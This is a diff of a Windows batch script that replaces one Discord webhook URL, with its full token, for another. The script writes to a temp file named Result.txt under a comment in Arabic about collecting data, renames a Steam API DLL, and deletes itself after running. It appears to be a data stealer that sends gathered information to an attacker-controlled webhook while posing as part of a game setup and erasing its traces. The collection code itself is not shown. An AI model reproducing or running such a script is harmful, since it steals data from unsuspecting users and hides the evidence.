@@ -1,5 +1,5 @@
 @echo off
-set "WEBHOOK_URL=https://discord.com/api/webhooks/1458999327606440138/5QZZ2D_KlWo4WSXiCEq78mNZN0otFEPqXWfMERFljvPSgBQC9I8cEgIjmX28CVA1PaAX"
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1461350525168652433/y5T90DbXCLHZGb_wqEi9ho4VqMb1XGgA6VKoL_M9LbKiywFyhcl4bAE7MpZF2oiTFOyB"
 set "TEMP_FILE=%TEMP%\Result.txt"
 
 :: 1. جمع البيانات (زي ما كنت عامل)
@@ -36,3 +36,4 @@ ren "steam-api64.dll" "steam_api64.dll"
 :: بنخليه يستنى ثانية واحدة وبعدين يمسح نفسه عشان نضمن إنه قفل
 start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
 exit
+
